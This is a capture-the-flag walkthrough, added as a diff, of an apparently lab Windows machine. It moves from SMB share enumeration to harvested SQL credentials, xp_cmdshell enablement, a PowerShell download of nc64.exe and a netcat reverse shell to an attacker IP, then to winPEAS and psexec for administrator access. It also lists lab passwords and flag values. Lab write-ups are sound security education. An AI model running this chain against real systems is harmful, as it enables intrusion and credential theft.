@@ -1,0 +1,119 @@
+We start with a scan: sudo nmap --min-rate 5000 -p- -sC -sV (target ip)
+
+We find that smp port and Microsoft SQL server running on port 1433.
+
+We are going to use the smbclient tool: smbclient -N -L \\\\(target ip)\\
+
+-N : No password
+-L : This option allows you to look at what services are available on a server
+
+Note: the switch -N has to come first before -L.
+
+Now, we can see that we have four shares. One of them is ADMIN$
+
+We cant login to ADMIN$. However, we can login to backups. We do: smbclient -N \\\\(target ip)\\backups
+
+We see a file called prod.dtsConfig. We can download it to our local machine using: get prod.dtsConfig .
+
+When we open this file, we can see a User ID of : RCHETYPE\sql_svc and a password of:M3g4c0rp123. This might come in handy later.
+
+We can use Impacket tool which has some useful python scripts which can allow us to connect to the MSSQL server using these credintials that we have found.
+
+To get the tool, we do: git clone https://github.com/SecureAuthCorp/impacket.git .
+Then, cd impacket. Then, pip3 install . .
+
+To use the tool, we need to : cd impacket/examples/
+
+Then, python3 mssqlclient.py -h .
+
+We can try to connect to the MSSQL server by using impacket's mssqlclient.py script along with the
+following flags: -windows-auth : this flag is specified to use Windows Authentication.
+
+So, in ~/impacket/examples we do: python3 mssqlclient.py (User ID)@(target ip) -windows-auth.
+
+Then, we provide the password for this user id.
+
+We are in!.
+
+We need the  xp_cmdshell to be runnable on this sql server.  We try: EXEC xp_cmdshell 'net user'; . However, this will return an error as xp_cmdshell is blocked. A simple google search on how to activate this component results in this command that we need to execute: EXEC sp_configure 'show advanced options', '1'
+RECONFIGURE
+-- this enables xp_cmdshell
+EXEC sp_configure 'xp_cmdshell', '1' 
+RECONFIGURE.
+
+Now that xp_cmdshell is activated, we can attempt to have a reverse shell on the sql server.
+
+To get a reverse shell, we need to download nc64.exe from this Github: https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
+
+In the same folder that we downloaded this file in, we do: sudo python3 -m http.server 80. And in a different cmd tab we run a netcat that listens on port 443: sudo nc -lvnp 443
+
+In order to upload the binary in the target system, we need to find the appropriate folder for that. We will be
+using PowerShell for the following tasks since it gives us much more features then the regular command
+prompt. In order to use it, we will have to specify it each time we want to execute it until we get the reverse
+shell. To do that, we will use the following syntax: powershell -c command
+The -c flag instructs the powershell to execute the command.
+We will print the current working directory by issuing the following:
+We found the folder where we will place the binary. To do that, we will use the wget alias within PowerShell
+( wget is actually just an alias for Invoke-WebRequest ):
+
+As a user archetype\sql_svc , we don't have enough privileges to upload files in a system directory and
+only user Administrator can perform actions with higher privileges. We need to change the current
+working directory somewhere in the home directory of our user where it will be possible to write. After a
+quick enumeration we found that Downloads is working perfectly for us to place our binary. In order to do
+that, we are going to use the wget tool within PowerShell:
+
+ xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
+http://10.10.14.9/nc64.exe -outfile nc64.exe"
+
+This will upload the nc64.exe file to the downloads file in the target machine. 
+
+To execute the file in the target machine: xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443" .
+
+Now, when we come back to the tat that is running ncat, we can see that we now have access to the machine as sql_svc.
+
+The user flag can found in C:\Users\sql_svc_Desktop.
+
+User flag: 3e7b102e78218e935bf3f4951fec21a3
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Privilage Escalation:
+
+We will use winpeas to escalate our privilage in this machine. We can download it from this Github: https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
+
+We make sure that python3 -m http.server 80 is still running.
+
+In the target machine we do: powershell. This will allow us to run powershell commands.
+
+Then, we do: wget http://(our ip address)//winPEASEx64.exe -outfile winPease.exe .
+
+This will upload the winPease tool to the target machine.
+
+To run the tool: .\winPease.exe
+
+The output of the tool is pretty long. However, it is very useful to look at. The tool gave us a good piece of info which is the location of the file that contains the powershell history. This is great is can has the password of the admin user.
+
+We navigate to the file location: cd  \Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine.
+
+We get the content of the file : type ConsoleHost_history.txt.
+
+We indeed get the password for the admin user: MEGACORP_4dm1n!!
+
+We got in cleartext the password for the Administrator user which is MEGACORP_4dm1n!!
+We can now use the tool psexec.py again from the Impacket suite to get a shell as the administrator:
+
+In our local machine, we change our directory to : ~/impaket/examples . Then, we do python3 psexec.py administrator@(TARGET_IP). Then, we provide the password that we have.
+
+We are in as admin!!.
+
+Admin flag:b91ccec3305e98240082d4474b848528
+
+//END
+
+
+
+
+
+
+
+
